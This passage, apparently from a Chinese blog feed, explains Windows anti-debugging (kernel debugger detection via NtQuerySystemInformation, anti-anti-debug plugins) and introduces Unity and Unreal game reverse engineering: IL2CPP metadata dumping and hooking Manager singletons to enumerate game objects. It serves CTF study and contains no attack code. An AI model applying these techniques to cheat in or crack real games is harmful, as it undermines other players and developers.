being_debugged</span><br></pre></td></tr></table></figure><p>调试器在调试进程时调用DebugActiveProcess与被调试程序建立连接。</p><p>DebugActiveProcess首先在0环创建一个DEBUG_OBJECT结构体作为调试进程与被调试进程建立连接的桥梁。</p><p>DEBUG_OBJECT结构体的句柄存放在TEB +0xF24的位置（3环只能存放句柄）</p><p>DEBUG_OBJECT的地址存放在被调试进程的EPROCESS.DebugPort中（0环可以存放地址）。</p><p>DEBUG_OBJECT的本质是桥。</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007152102635.png" alt="image-20251007152102635"></p><p><strong>什么是句柄</strong>?</p><p>句柄就像“号码牌”或“引用凭证”</p><p>操作系统里有成千上万个对象（文件、线程、窗口……）。程序不可能直接去操作这些内核对象的真实内存地址（那是内核态的东西）。所以 Windows 给每个对象分配一个“编号”或“凭证”——这就是 <strong>句柄（Handle）</strong>。</p><table><thead><tr><th>层次</th><th>对象</th><th>存放位置</th><th>权限</th></tr></thead><tbody><tr><td><strong>内核对象 (Kernel Object)</strong></td><td>文件对象、进程对象、线程对象、互斥体等</td><td>Ring0（内核态）</td><td>操作系统管理</td></tr><tr><td><strong>句柄 (Handle)</strong></td><td>用户态用于引用这些对象的“索引”</td><td>Ring3（用户态）</td><td>每个进程有独立的句柄表</td></tr></tbody></table><p><strong>句柄不是对象本身</strong>，而是<strong>一个指向对象的索引</strong>。</p><p>每个进程有自己的句柄表（Handle Table），表项指向内核对象。</p><p>内核通过“引用计数”确保对象在还有句柄指向时不会被销毁。</p><p>当你调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hFile = CreateFileA(&quot;test.txt&quot;, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);</span><br></pre></td></tr></table></figure><p>执行过程如下：</p><ol><li>内核创建或打开一个文件对象（FileObject）。</li><li>在当前进程的句柄表中分配一个槽位（比如编号 <code>0x74</code>）。</li><li>返回 <code>0x74</code>（即句柄）给用户程序。</li><li>当你调用 <code>ReadFile(hFile, …)</code> 时，内核根据这个句柄去查句柄表，找到真正的文件对象。</li></ol><p>程序的运行需要使用内存来存储数据和指令，cpu根据内存的地址来取对应的数据，然而物理内存的大小空间在安装好后是固定不变的，在程序运行中可能出现物理内存不够的情况，这个时候windows系统开发者就想出一个虚拟内存机制，通过该机制cpu不再直接用物理内存地址来访问内存数据，而是经过虚拟内存里逻辑地址来访问内存数据，虚拟内存里有一张映射关系表，存储了每个逻辑地址和物理地址的相应关系，有了这个映射表，就可以不再拘泥于物理内存的一些不足，例如空间不足，物理内存碎片不能连续分配地址等，用逻辑地址先找到对应物理地址后就能找到数据。</p><p>但是,虚拟内存机制虽然解决了内存的上述问题，却在后续的使用中还是有新的问题出现，这就是为什么又会出现句柄，下面来看一下原因。</p><p>如下图所示，物理地址灰色部分1，3，4，5，6等已经存上了数据，白色背景代表的2，7，9，10，15可以存数据但是已经被打断，如果借用虚拟内存就可以用连续不打断的一套逻辑地址来分配地址，这样就有了windows下的虚拟内存机制，<strong>但是虚拟内存管理灵活变动的优点</strong>，<strong>也就意味着里面的地址对应关系会经常发生变动</strong>，像之前的逻辑地址1-&gt;物理地址2的关系 如果变成了 逻辑地址8-&gt;物理地址2的话，cpu如果不知道这个变动，还拿着之前的 逻辑地址1-&gt;物理地址2的关系 来找的话就会出错，所以虚拟内存机制还是不完善，这种映射关系的变动如果做个管理登记的话这个问题就好办了，句柄就有这样的作用。</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007154452600.png" alt="image-20251007154452600"></p><p>假如之前cpu 是通过  句柄1 -&gt; 逻辑地址1 -&gt; 物理地址2 这个关系一路找到数据，当逻辑地址1-&gt;物理地址2这个关系变成 逻辑地址8-&gt;物理地址2的时候， 系统在 句柄1的关系那也修改成 句柄1-&gt;逻辑地址8-&gt;物理地址2.</p><p><strong>言归正传</strong></p><p>Windows 的调试系统是 <strong>通过“调试端口 (Debug Port)”机制实现的</strong>。内核通过 <code>DebugPort</code> 把 <strong>被调试进程</strong> 与 <strong>调试器持有的调试对象</strong> 关联起来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Debugger process  ---- owns a handle to ----&gt;  DebugObject</span><br><span class="line">                                           ↑</span><br><span class="line">                                           │</span><br><span class="line">                        EPROCESS.DebugPort ┘</span><br><span class="line">                           (of the debuggee)</span><br></pre></td></tr></table></figure><h2 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h2><p><strong>通过NtQuerySystemInformation查询内核调试器的存在</strong></p><table><thead><tr><th>类型</th><th>调试对象</th><th>检测字段</th><th>典型场景</th></tr></thead><tbody><tr><td><strong>用户态调试 (User-mode Debugger)</strong></td><td>像 x64dbg、WinDbg (user mode)、Visual Studio 调试器</td><td><code>EPROCESS.DebugPort</code> &#x2F; <code>ProcessDebugPort</code></td><td>普通程序调试</td></tr><tr><td><strong>内核态调试 (Kernel Debugger)</strong></td><td>KD、WinDbg（kernel mode）、KDNET、COM 连接</td><td>全局标志（<code>KdDebuggerEnabled</code>, <code>KdDebuggerNotPresent</code>）</td><td>系统级调试、驱动分析</td></tr></tbody></table><p>Windows 内核维护两个关键全局变量：</p><table><thead><tr><th>内核变量名</th><th>含义</th><th>典型值</th></tr></thead><tbody><tr><td><code>KdDebuggerEnabled</code></td><td>是否启用了内核调试机制</td><td><code>1</code> &#x3D; KD 启用</td></tr><tr><td><code>KdDebuggerNotPresent</code></td><td>调试器当前是否附加</td><td><code>0</code> &#x3D; 调试器已连接，<code>1</code> &#x3D; 未连接</td></tr></tbody></table><p>检测<strong>内核调试器</strong>用的是 **<code>NtQuerySystemInformation</code>**，而不是针对进程的 <code>NtQueryInformationProcess</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SYSTEM_KERNEL_DEBUGGER_INFORMATION info;</span><br><span class="line">NTSTATUS status = NtQuerySystemInformation(</span><br><span class="line">    SystemKernelDebuggerInformation,   <span class="comment">// InfoClass = 0x23</span></span><br><span class="line">    &amp;info,</span><br><span class="line">    <span class="keyword">sizeof</span>(info),</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (NT_SUCCESS(status) &amp;&amp; info.KernelDebuggerEnabled &amp;&amp; !info.KernelDebuggerNotPresent) &#123;</span><br><span class="line">    <span class="keyword">return</span> TRUE;  <span class="comment">// 内核调试器已连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> FALSE; <span class="comment">// 未检测到内核调试器</span></span><br></pre></td></tr></table></figure><p><code>SYSTEM_KERNEL_DEBUGGER_INFORMATION info;</code> 创建一个结构体变量 <code>info</code>，用于接收内核关于内核调试器状态的两个布尔值：<code>KernelDebuggerEnabled</code> 和 <code>KernelDebuggerNotPresent</code>。</p><p><code>NTSTATUS status = NtQuerySystemInformation(SystemKernelDebuggerInformation, &amp;info, sizeof(info), NULL);</code> 通过 <code>NtQuerySystemInformation</code> 查询系统信息，<code>SystemKernelDebuggerInformation</code>（通常值 <code>0x23</code>）表示请求“内核调试器信息”。内核会把结果写入 <code>info</code>，并把返回状态放到 <code>status</code> 中。</p><p><code>NT_SUCCESS(status)</code> 宏判断系统调用是否成功（返回状态码表示成功）。</p><p><code>info.KernelDebuggerEnabled</code> 如果为 <code>TRUE</code> 表示系统启用了内核调试功能（Kd 被启用）。</p><p><code>!info.KernelDebuggerNotPresent``KernelDebuggerNotPresent</code> 为 <code>FALSE</code> 则表示内核调试器<strong>当前已连接&#x2F;附着</strong>。因此 <code>!info.KernelDebuggerNotPresent</code> 为 <code>TRUE</code> 时意味着“内核调试器正在连接中”。</p><p>合并判断：<code>NT_SUCCESS(status) &amp;&amp; info.KernelDebuggerEnabled &amp;&amp; !info.KernelDebuggerNotPresent</code> 三者都成立时（调用成功、KD 被启用、且当前已附着），函数就返回 <code>TRUE</code> —— <strong>表示检测到内核调试器正在连接（attached）</strong>。</p><h2 id="常见的反反调试插件"><a href="#常见的反反调试插件" class="headerlink" title="常见的反反调试插件"></a>常见的反反调试插件</h2><p>sharpod</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007164821109.png" alt="image-20251007164821109"></p><p>Scyllahide</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007164909401.png" alt="image-20251007164909401"></p><p>此外还有Titanhide</p><p>这个是内核层面的反反调试了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF逆向常见反调试技术总结&quot;&gt;&lt;a href=&quot;#CTF逆向常见反调试技术总结&quot; class=&quot;headerlink&quot; title=&quot;CTF逆向常见反调试技术总结&quot;&gt;&lt;/a&gt;CTF逆向常见反调试技术总结&lt;/h1&gt;&lt;p&gt;反调试主要为了干扰动态调试&lt;/p&gt;
&lt;p&gt;反</summary>
      
    
    
    
    <category term="Re" scheme="http://matriy330.github.io/categories/Re/"/>
    
    
    <category term="Re" scheme="http://matriy330.github.io/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>游戏逆向初探</title>
    <link href="http://matriy330.github.io/65f6ce99/"/>
    <id>http://matriy330.github.io/65f6ce99/</id>
    <published>2025-10-05T16:00:00.000Z</published>
    <updated>2025-10-07T14:30:35.981Z</updated>
    
    <content type="html"><![CDATA[<h1 id="游戏逆向初探"><a href="#游戏逆向初探" class="headerlink" title="游戏逆向初探"></a>游戏逆向初探</h1><p>参考视频：<a href="https://xz.aliyun.com/course-view?id=36">线上培训 -先知社区</a></p><h2 id="Unity3D"><a href="#Unity3D" class="headerlink" title="Unity3D"></a>Unity3D</h2><p><a href="https://zhuanlan.zhihu.com/p/19972689">Unity将来时：IL2CPP是什么？ - 知乎</a></p><p><strong>Unity3D</strong> 是一个由 <strong>Unity Technologies</strong> 开发的 <strong>跨平台游戏引擎</strong>，主要用于制作 <strong>2D 和 3D 游戏、交互式模拟、虚拟现实（VR）、增强现实（AR）以及其他实时三维内容</strong>。</p><p>Unity3D 是一个 <strong>游戏引擎（Game Engine）</strong>，简单来说，它是一个“做游戏的软件框架”。</p><p>使用 <strong>C#</strong> 编写逻辑控制（如人物移动、AI、UI响应等）。</p><p>Unity3D 中的 <strong>Mono</strong> 和 <strong>IL2CPP</strong> 是两种不同的<strong>脚本后端</strong>，它们负责将 C# 代码编译并运行在目标平台上。它们的主要区别在于编译方式、性能、兼容性、安全性等方面：</p><p><strong>平台支持与兼容性：</strong></p><ul><li><strong>Mono:</strong> 支持广泛的平台，但在一些<strong>特定平台或架构上受限</strong>：<ul><li><strong>iOS:<strong>不再被允许</strong>。Apple 禁止在 iOS 上使用 JIT 编译（安全原因）。因此 iOS 发布</strong>必须使用 IL2CPP。</li><li><strong>WebGL:</strong> 由于浏览器沙箱限制，无法进行 JIT 编译，因此 <strong>WebGL 必须使用 IL2CPP</strong>。</li><li><strong>某些主机&#x2F;嵌入式平台：</strong> 可能不支持 Mono 或其 JIT。</li></ul></li><li><strong>IL2CPP:<strong>平台支持更广泛且是未来的方向</strong>。它是支持 iOS、WebGL、Universal Windows Platform (UWP) 和一些主机平台的</strong>唯一选择。几乎支持所有 Unity 目标平台。(<strong>iOS 和 WebGL： 强制使用 IL2CPP。</strong>)</li></ul><p><strong>安全性：</strong></p><ul><li><strong>Mono:</strong> 托管字节码 (.dll) <strong>相对容易被反编译</strong>（使用工具如 ILSpy, dnSpy），代码逻辑和资源路径容易暴露。</li><li>**IL2CPP:**安全性大大提高。将 C# 代码转换为 C++ 代码，再编译成机器码，使得反编译回原始 C# 逻辑变得极其困难（虽然反汇编原生代码是可能的，但理解成本极高）。是保护游戏逻辑和知识产权的更好选择。</li></ul><p><strong>如果 Unity 项目没有使用 IL2CPP</strong>（而是使用 Mono 作为脚本后端），那么 <strong>主要的游戏逻辑代码</strong> 都在 <code>Assembly-CSharp.dll</code> 中</p><p>例如<a href="https://matriy330.github.io/63d050a6/">TSCTF-J 2024 | Matriy’s blog</a>的iPlayPingpang</p><p>对于一般的文件结构，都会有一个后缀为_Data的文件夹，并且里面有一个名为Managed的文件夹，而那个文件夹里的Assembly-CSharp.dll文件正是我们需要的东西，里面包含了作者的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/Managed/</span><br><span class="line">├── Assembly-CSharp.dll      ← 游戏脚本主逻辑</span><br><span class="line">├── Assembly-CSharp-firstpass.dll  ← 插件或早期编译的脚本</span><br><span class="line">├── UnityEngine.CoreModule.dll     ← Unity 官方 API</span><br><span class="line">├── mscorlib.dll             ← .NET 基础类库</span><br><span class="line">└── System.dll / System.Core.dll   ← .NET 组件</span><br></pre></td></tr></table></figure><p>再介绍IL2CPP前，先介绍下IL</p><p><strong>IL</strong> 的全称是 <strong>Intermediate Language（中间语言）</strong>它是 <strong>C# 编译后的中间形式</strong>，不是机器码，也不是源代码。</p><p>如一个C#代码：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Hello</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span> &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用 C# 编译器（<code>csc.exe</code>）编译后，会生成一个 <code>Hello.exe</code> 或 <code>.dll</code>。但这个文件内部并不是 CPU 能直接运行的机器码，而是 IL 指令，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IL_0000: ldstr &quot;Hello, World!&quot;</span><br><span class="line">IL_0005: call void [System.Console]System.Console::WriteLine(string)</span><br><span class="line">IL_000a: ret</span><br></pre></td></tr></table></figure><p>这就是 IL：一种介于高级语言（C#）和底层机器码之间的中间层语言。</p><p>让程序与 CPU 架构无关（跨平台）可以被 <strong>CLR（Common Language Runtime）</strong> 或 <strong>Mono Runtime</strong> 即时编译（JIT）成机器码提供了更强的反编译可能性（这也是为什么 <code>.NET</code> 程序容易被反编译）</p><p>类似一个面向对象的汇编语言，并且它是完全基于堆栈的，它运行在虚拟机上（.Net Framework, Mono VM）的语言。</p><p>具体过程是：C#或者VB这样遵循CLI规范的高级语言，被先被各自的编译器编译成中间语言：IL（CIL），等到需要真正执行的时候，这些IL会被加载到运行时库，也就是VM中，由VM动态的编译成汇编代码（JIT）然后在执行。</p><p>本质上说，到了IL这一层级，它是由哪门高级语言创建的也不是那么重要了，你可以用C#，VB，Boo，Unity Script甚至C++，只要有相应的编译器能够将其编译成IL都行</p><p><strong>Mono 虚拟机</strong> 是一个用来执行 C#（IL）代码的跨平台运行时，类似于 Java 的 JVM。一般电脑不会自带，但 Unity 游戏会自动打包它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C# 源码</span><br><span class="line">  ↓</span><br><span class="line">C# 编译器 (Roslyn)</span><br><span class="line">  ↓</span><br><span class="line">生成 IL (中间语言)</span><br><span class="line">  ↓</span><br><span class="line">Mono 虚拟机（Mono Runtime）</span><br><span class="line">  ↓</span><br><span class="line">在运行时将 IL 即时编译成机器码（JIT）</span><br></pre></td></tr></table></figure><blockquote><p>JIT（即时编译）在运行时转换 IL → 机器码，有额外开销</p></blockquote><p><strong>IL2CPP</strong> 是 Unity 自己设计的一个编译后端，全称是 **Intermediate Language To C++**。它的作用就是把 <strong>IL（中间语言）转换成 C++ 代码</strong>，然后再编译成原生机器码。</p><p>简言之，就是把IL中间语言转换成CPP文件。大家如果看明白了上面动态语言的 CLI， IL以及VM，再看到IL2CPP一定心中充满了疑惑。现在的大趋势都是把语言加上动态特性，哪怕是c++这样的静态语言，也出现了适合IL的c++编译 器，为啥Unity要反其道而行之，把IL再弄回静态的CPP呢？</p><ol><li><p>Mono VM在各个平台移植，维护非常耗时，有时甚至不可能完成</p><p>Mono的跨平台是通过Mono VM实现的，有几个平台，就要实现几个VM，像Unity这样支持多平台的引擎，Mono官方的VM肯定是不能满足需求的。所以针对不同的新平 台，Unity的项目组就要把VM给移植一遍，同时解决VM里面发现的bug。这非常耗时耗力。这些能移植的平台还好说，还有比如WebGL这样基于浏览 器的平台。要让WebGL支持Mono的VM几乎是不可能的。</p></li><li><p>Mono版本授权受限</p><p>很多C#的新特性无法使用。这是因为Mono 授权受限，导致Unity无法升级Mono。如果换做是IL2CPP，IL2CPP VM这套完全自己开发的组件，就解决了这个问题。</p></li><li><p>提高运行效率：根据官方的实验数据，换成IL2CPP以后，程序的运行效率有了1.5-2.0倍的提升。</p></li></ol><p>既然 IL 是跨平台的，那为什么 Unity 还要舍弃它、转成 C++？这样不是反而变得更‘依赖平台’了吗？</p><p>Unity 引入 IL2CPP 的目的，其实不是“跨平台”，而是解决 <strong>性能</strong> 和 <strong>安全性</strong> 问题。</p><p>IL → C++：是“提前编译”（AOT），不是“放弃跨平台”</p><p>IL2CPP 并不是放弃跨平台，而是把“编译成机器码”的工作提前做好</p><blockquote><p>Unity 仍然“跨平台”，但跨平台的<strong>责任从运行时转移到了编译阶段</strong>。</p></blockquote><p>原来：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005162206178.png" alt="image-20251005162206178"></p><p>IL2CPP</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005162235376.png" alt="image-20251005162235376"></p><blockquote><p>PS：其实就是IL2CPP牺牲了Mono跨平台的优势来保证安全，快速</p></blockquote><p>C#的产出必须为IL，这个是绕不开的(C# 是个很复杂的语言（泛型、委托、LINQ、async、反射、属性、接口、多继承模型、GC……），如果C#要到C++差不多是重新设计一个语言，不如利用IL来做一下适配)</p><p>对比 Mono 模式（早期 Unity）</p><p>在 <strong>Mono 模式</strong> 下：</p><ul><li>游戏包里包含 <code>Assembly-CSharp.dll</code>（IL 字节码）。</li><li>游戏运行时自带 <strong>Mono 虚拟机</strong>。</li><li>Mono 会在运行时 <strong>即时编译（JIT）</strong> IL → 机器码。</li></ul><blockquote><p>也就是在你运行的时候Mono会翻译成机器码执行</p></blockquote><p>而IL2CPP不一样，它是开发者直接转化除了CPP然后编译好给你，针对不同平台如ubuntu,ios都给一个，相当于牺牲了部分跨平台的优势</p><p>旧 Unity（Mono） &#x3D; “运行时编译 IL”；</p><p>新 Unity（IL2CPP） &#x3D; “提前编译 IL”。</p><p>Mono 模式：</p><p>游戏包里包含：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/Managed/</span><br><span class="line"> ├─ Assembly-CSharp.dll   ← 脚本IL</span><br><span class="line"> ├─ mscorlib.dll</span><br><span class="line"> └─ UnityEngine.CoreModule.dll</span><br><span class="line">/Mono/</span><br><span class="line"> ├─ mono.dll              ← 虚拟机执行IL</span><br></pre></td></tr></table></figure><p>IL2CPP 模式：</p><p>游戏包里包含：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/libil2cpp.so             ← 已经编译好的C++机器码</span><br><span class="line">/global-metadata.dat      ← 元数据表</span><br></pre></td></tr></table></figure><blockquote><p>global-metadata.dat元数据表（类、方法、字符串等）</p></blockquote><p>如SUSCTF2025的一道题为例：xxx</p><p><strong>一般dll类型的unity游戏逆向，唯一核心就是逆向&#x2F;修改某个 dll 文件就可以了。而一般IL2CPP的Unity3D游戏的逆向，大多只需要根据global-metadata.dat和libil2cpp.so来进行就可以了。目标异常明确，这也是 Unity3D 和 其它安卓逆向不同的地方。</strong></p><p><a href="https://mdr.skyeye.qianxin.com/forum/share/1294">奇安信攻防社区-浅谈CTF中的unity游戏逆向</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005164925430.png" alt="image-20251005164925430"></p><p>IL2CPP的一些工具</p><p>恢复globalmetadata.dat里的方法，可以导入到libil2cpp.so<a href="https://github.com/Perfare/Il2CppDumper">Perfare&#x2F;Il2CppDumper: Unity il2cpp reverse engineer</a></p><p>恢复一个dump.cs：需要有root机<a href="https://github.com/Perfare/Zygisk-Il2CppDumper">Perfare&#x2F;Zygisk-Il2CppDumper: Using Zygisk to dump il2cpp data at runtime</a></p><p>global-metadata主要内容</p><p>Il2CppGlobalMetadataHeader:文件头部，包含数据偏移等信息。</p><p>Il2CppClassDefinition:所有类的信息。</p><p>Il2CppMethodDefinition:所有方法的信息(方法索引、类索引、返回值等)。</p><p>Il2CppFieldDefinition:所有字段信息(名称、偏移等)Il2CppStringLiteral:字符串字面量表。</p><p>关键数据:</p><p>methodPointers[]数组</p><p>metadataUsages[]数组</p><p>global-metadata中metadataUsagePairs存储了metadataUsages[]的索引和类型信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌────────────────────────┐</span><br><span class="line">│ MetadataHeader         │← 文件头：记录各段偏移与长度</span><br><span class="line">├────────────────────────┤</span><br><span class="line">│ Metadata Tables         │← 核心：各种定义表（Type/Method/Field等）</span><br><span class="line">├────────────────────────┤</span><br><span class="line">│ String Literal Section  │← 字符串字面量常量区（如类名、方法名）</span><br><span class="line">└────────────────────────┘</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">struct MetadataHeader &#123;</span><br><span class="line">    int signature;                // 魔数标识 (0xFAB11BAF)</span><br><span class="line">    int version;                  // 版本号（24~29等）</span><br><span class="line">    int stringLiteralOffset;</span><br><span class="line">    int stringLiteralCount;</span><br><span class="line">    int stringLiteralDataOffset;</span><br><span class="line">    int stringLiteralDataCount;</span><br><span class="line">    int stringOffset;</span><br><span class="line">    int stringCount;</span><br><span class="line">    int eventsOffset;</span><br><span class="line">    int eventsCount;</span><br><span class="line">    int propertiesOffset;</span><br><span class="line">    int propertiesCount;</span><br><span class="line">    int methodsOffset;</span><br><span class="line">    int methodsCount;</span><br><span class="line">    int parameterDefaultValuesOffset;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Unity一个比较显著的特点就是一切都由Manager实例进行管理。实际利用的时候，往往是找到对应类的get instance函数，直接获取该类实例的地址，然后调用其对应的成员函数，来获取实体列表等</p><p>在 Unity 引擎底层（尤其是 C++ 引擎代码中），所有子系统（场景、物理、渲染、音频、输入、资源等）都由各自的 <strong>Manager 类（管理器）</strong> 统一管理。</p><p>比如：</p><table><thead><tr><th>Manager 名称</th><th>管理的内容</th></tr></thead><tbody><tr><td><code>GameObjectManager</code></td><td>所有场景中的游戏对象（GameObject）</td></tr><tr><td><code>ComponentManager</code></td><td>所有组件（Component）</td></tr><tr><td><code>SceneManager</code></td><td>场景加载与切换</td></tr><tr><td><code>PhysicsManager</code></td><td>物理系统（刚体、碰撞体）</td></tr><tr><td><code>AudioManager</code></td><td>声音与音效</td></tr><tr><td><code>InputManager</code></td><td>键鼠&#x2F;手柄输入</td></tr><tr><td><code>ResourceManager</code></td><td>资源加载与卸载</td></tr><tr><td><code>PlayerLoopManager</code></td><td>主循环（每帧更新逻辑）</td></tr></tbody></table><p>这些类通常都被设计成 <strong>单例（Singleton）</strong>，<br> 也就是说：</p><blockquote><p>在游戏运行过程中，全局只存在一个实例。</p></blockquote><p>在单例模式中，一个类通常提供一个静态的访问方法，比如：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">GameObjectManager</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">static</span> GameObjectManager* GetInstance(); <span class="comment">// 获取唯一实例</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">UpdateAllObjects</span>()</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当你在逆向分析 Unity 游戏时（尤其是 IL2CPP 或 Native 段），很多有用的数据都藏在这些 <strong>Manager 实例</strong> 里。</p><p>比如：</p><ul><li>所有当前场景的玩家对象（GameObject）</li><li>想枚举所有正在播放的音效</li><li>读取当前摄像机的参数</li></ul><p>这些数据都不是独立散落的，而是存储在某个 Manager 结构中。所以逆向时的流程通常是：</p><ol><li>找到 <code>XXXManager::GetInstance()</code> 的函数地址（单例获取器）</li><li>调用它，拿到全局 Manager 的内存地址</li><li>从该对象的成员变量中，访问各种列表、容器、实体对象</li></ol><p><strong>举个例子（伪代码）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 1. 获取 GameObjectManager 的实例</span><br><span class="line">GameObjectManager* mgr = GameObjectManager::GetInstance();</span><br><span class="line"></span><br><span class="line">// 2. 调用成员函数或直接访问成员变量</span><br><span class="line">std::vector&lt;GameObject*&gt; allObjects = mgr-&gt;GetActiveObjects();</span><br><span class="line">for (auto obj : allObjects) &#123;</span><br><span class="line">    printf(&quot;Name = %s\n&quot;, obj-&gt;name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在逆向时：</p><ul><li>你在 IDA 里定位 <code>GameObjectManager::GetInstance</code>；</li><li>Hook 或调用它；</li><li>从返回的地址（即单例实例）偏移出列表字段；</li><li>遍历得到所有对象指针。</li></ul><p>U3D的防御一般是global-metadata.dat的加密,函数名混淆等</p><h2 id="UE引擎"><a href="#UE引擎" class="headerlink" title="UE引擎"></a>UE引擎</h2><h3 id="UE简介"><a href="#UE简介" class="headerlink" title="UE简介"></a>UE简介</h3><p>UE 采用对象(UObject)管理系统，所有的UE反射系统管理的类都是UOject的继承，并由 UE的全局对象数组(GObjects)和名称表(GNames)进行管理。UE的反射系统存储了类、对象、变量、函数等信息，主要与GObjects和 GNames这两个全局数据结构有关。</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005172923941.png" alt="image-20251005172923941"></p><blockquote><p>这让引擎能：</p><ul><li>在编辑器中自动显示属性；</li><li>支持序列化；</li><li>与蓝图交互；</li><li>实现运行时元信息访问。</li></ul></blockquote><p>UE 的底层是 <strong>纯 C++ 实现</strong> 的。游戏逻辑可以通过两种方式编写：</p><table><thead><tr><th>层</th><th>技术</th><th>特点</th></tr></thead><tbody><tr><td>高层</td><td>Blueprint 蓝图</td><td>可视化逻辑、易上手</td></tr><tr><td>底层</td><td>C++</td><td>性能高、可自定义引擎逻辑</td></tr></tbody></table><table><thead><tr><th>比较项</th><th><strong>Unity3D</strong></th><th><strong>Unreal Engine 4</strong></th></tr></thead><tbody><tr><td><strong>开发语言</strong></td><td>C#（托管语言，基于 Mono&#x2F;IL2CPP）</td><td>C++（原生代码） + Blueprint</td></tr><tr><td><strong>源码开放</strong></td><td>❌ 部分封闭（引擎不开源）</td><td>✅ 全部开源，可修改底层</td></tr><tr><td><strong>脚本层机制</strong></td><td>Mono 虚拟机 &#x2F; IL2CPP</td><td>反射系统（UObject）</td></tr><tr><td><strong>渲染能力</strong></td><td>中等偏上，适合中小型项目</td><td>顶级水准（AAA 级实时光照、PBR、Lumen）</td></tr><tr><td><strong>性能优化</strong></td><td>依赖 IL2CPP 与引擎优化</td><td>原生 C++，性能极高</td></tr><tr><td><strong>学习曲线</strong></td><td>简单（C# + 可视化 Editor）</td><td>较难（C++ + 架构复杂）</td></tr><tr><td><strong>典型用途</strong></td><td>独立游戏、移动游戏、教育、AR&#x2F;VR</td><td>3A 